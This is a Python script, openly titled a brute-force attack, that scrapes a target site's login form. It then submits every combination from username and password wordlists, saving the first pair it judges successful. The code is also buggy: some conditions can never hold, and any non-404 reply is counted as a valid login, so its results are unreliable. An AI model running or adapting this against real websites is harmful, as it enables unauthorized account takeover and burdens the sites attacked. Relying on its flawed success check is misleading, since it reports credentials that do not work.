import requests
from lxml import html
from sys import exit
import requests
from lxml import html
from sys import exit
from bs4 import BeautifulSoup as beautifulSoup
from requests_html import HTMLSession
from pprint import pprint
from urllib.parse import urljoin

SUCCESS_MESSAGE = ["success", "SUCCESS", "successfully"]
INCORRECT_MESSAGE = ["error", "required error", "unrecognized"]


# Open File and read each line
def open_file(file_path):
    lines = [lines.rstrip('\n') for lines in open(file_path).readlines()]  # Return each lines of the file
    return lines


# Definition of each file

# Potentials password
PASSWORDS = open_file('./PossiblePw.txt')

# Potentials usernames
USERS = open_file('./PossibleUsernames.txt')

# Limit of trying connections
LIMIT_TRYING_ACCESSING_URL = 7

# initialize an HTTP session
session = HTMLSession()


def process_request(request, user, password, failed_aftertry):
    print("Trying these parameters: user: " + user + " and password: " + password)
    if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
        if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
            print("[+] Connection failed : Trying again ....")
            return
        else:
            failed_aftertry = failed_aftertry + 1
            print("[+] Connection failed : 404 Not Found (Verify your url)")
            print("[+] Failed to connect with:\n user: " + user + " and password: " + password)
    else:
        result = "\n[+] --------------------------------------------------------------"
        result += "\n[+] YOooCHA!! \nTheese Credentials succeed to LogIn:\n> username: " + user + " and " \
                                                                                                      "password: " \
                                                                                                      "" + password
        result += "\n[+] --------------------------------------------------------------\n"
        with open("./results.txt", "w+") as frr:
            frr.write(result)
        print(
            "[+] A Match succeed 'user: " + user + " and password: " + password + "' and have been saved at "
                                                                                      "./results.txt")
        exit()



def try_connection(url, user_field, password_field, input_tags):
    print("[+] Connecting to: " + url + "......\n")

    failed_aftertry = 0

    url_params = {}  # data that will be sent in the request respecting the form : {'key': 'value'}

    for user in USERS:
        # process_user(user, url, failed_aftertry, user_field, password_field, csrf_field)
        for password in PASSWORDS:
            for one_input in input_tags:
                one_input_type = one_input["type"]
                if one_input_type == "text" and one_input_type == "username":
                    one_input["value"] = user
                if one_input_type == "password" and one_input_type == "password":
                    one_input["value"] = password

            payload = {
                user_field: user,
                password_field: password
            }

            request = requests.post(url, data=payload)

            process_request(request, user, password, failed_aftertry)



def extract_field_form(url, html_contain):
    print("[+] Starting extraction...")
    soup = beautifulSoup(requests.get(url).content, "html.parser")
    all_forms = soup.find_all("form")

    for form in all_forms:
        inputs = []
        # in the next variable, we will gather all of the details of the HTML tags regarding the existing form
        form_details = {}

        action = form.attrs.get("action").lower()
        method = form.attrs.get("method", "get").lower()

        for one_input_tag in form.find_all("input"):
            type = one_input_tag.attrs.get("type", "text")
            name = one_input_tag.attrs.get("name")
            inputs.append({"type": type, "name": name})

        form_details["action"] = action
        form_details["method"] = method
        form_details["inputs"] = inputs


        for one_input_tag in form_details["inputs"]:
            if one_input_tag["name"] == "username":
                field_username = one_input_tag["name"]
            if one_input_tag["name"] == "password":
                field_password = one_input_tag["name"]
        try_connection(url, field_username, field_password,form_details["inputs"])




def main():
    print(" --------------------------------------------- ")
    print("           => Brute Force Attack <=            ")
    print(" --------------------------------------------- ")
    print("[+] Let's simulate a Brute Force Attack")

    # Field's Form -------
    # The link of the website
    url = input("\n[+] Enter the URL of the website that you want to attack : ")
    r = requests.get(url)

    extract_field_form(url, r.text)


if __name__ == '__main__':
    main()
